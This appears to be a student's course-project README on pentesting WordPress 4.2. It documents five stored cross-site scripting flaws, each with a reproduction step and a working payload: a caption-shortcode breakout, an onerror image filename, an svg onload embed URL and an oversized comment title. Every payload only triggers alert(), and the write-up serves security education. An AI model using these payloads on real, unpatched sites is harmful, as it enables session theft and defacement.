# Web-Security-Week7
# Project 7 - WordPress Pentesting

Time spent: **12** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Authenticated Stored Cross-site scripting
  - [x] Summary: 
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.3
  - [x] GIF Walkthrough: 
     - <img src='Authenticated Stored Cross-site scripting.gif' title='Authenticated Stored Cross-site scripting' width='' alt='' />
  - [x] Steps to recreate: 
     - Create a new post using the text tab and paste in the following: ```<a href="[caption code=">]</a><a title=" onmouseover=alert('test') ">link</a>``` Click publish, then view post, move the cursor to the link line, the alert will pop up.
  - [x] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/branches/4.2/src/wp-includes/class-wp-editor.php?rev=33361)
2. (Required) Authenticated Stored Cross-Site Scripting via Image Filename
  - [x] Summary: 
      - Vulnerability types:XSS
      - Tested in version: 4.2
      - Fixed in version:  4.2.10
  - [x] GIF Walkthrough: 
      - <img src='Authenticated Stored Cross-Site Scripting via Image Filename.gif' title='Authenticated Stored Cross-Site Scripting via Image Filename' width='' alt='' />
  - [x] Steps to recreate: 
     - Go to the media section and create a new media,then upload a picture from your computer. Now paste in the following line into the title 
   	 ```filename<img src=a onerror=alert(1)>.png``` Then click on the "View attachment page", the alert will pop up.


  - [x] Affected source code:
      - [Link 2](https://core.trac.wordpress.org/browser/branches/4.2/src/wp-admin/includes/media.php)
3. (Required) Authenticated Shortcode Tags Cross-Site Scripting 
  - [x] Summary: 
     - Vulnerability types:XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.5
  - [x] GIF Walkthrough: 
     - <img src='Authenticated Shortcode Tags Cross-Site Scripting .gif' title='Authenticated Shortcode Tags Cross-Site Scripting ' width='' alt='' />
  - [x] Steps to recreate: 
     - Create a text post just like part 1 and paste the following code into the text tab ```Another test![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>``` Click publish, then view post, move the cursor to any of the listed lines, the alert will pop up.
  - [x] Affected source code:
     - [Link 3](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
4. (Optional) Authenticated Stored Cross-Site Scripting in YouTube URL Embeds
  - [x] Summary: 
     - Vulnerability types:XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.13
  - [x] GIF Walkthrough: 
     - <img src='Authenticated Stored Cross-Site Scripting in YouTube URL Embeds.gif' title='Authenticated Stored Cross-Site Scripting in YouTube URL Embeds' width='' alt='' />
  - [x] Steps to recreate: 
     - Create a post that contains some kind of harmful embedded link; for example the following:``` [embed src='https://youtube.com/embed/123\x3csvg onload=alert(1)\x3e'][/embed]``` after we published the page,click view page,the alert will pop up.
  - [x] Affected source code:
     - [Link 4](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
5. (Optional) Comment Cross-Site Scripting
  - [x] Summary: 
     - Vulnerability types:XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
  - [x] GIF Walkthrough: 
      - <img src='Comment Cross-Site Scripting.gif' title='Comment Cross-Site Scripting' width='' alt='' />
  - [x] Steps to recreate: 
     - Create a comment post using the following: ```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 KB]..AAA'></a>```The [64 KB] indicates that the size of the the text(A) has to be at least 64 KB long.After posting the comment,the alert will pop up.
  - [x] Affected source code:
     - [Link 5](https://core.trac.wordpress.org/changeset/32299)
## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Had trouble using --random-agent in Kali. I used --rua instead which gives the wanted outputs too.

## License

    Copyright [2018] [Hongjie Huang]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
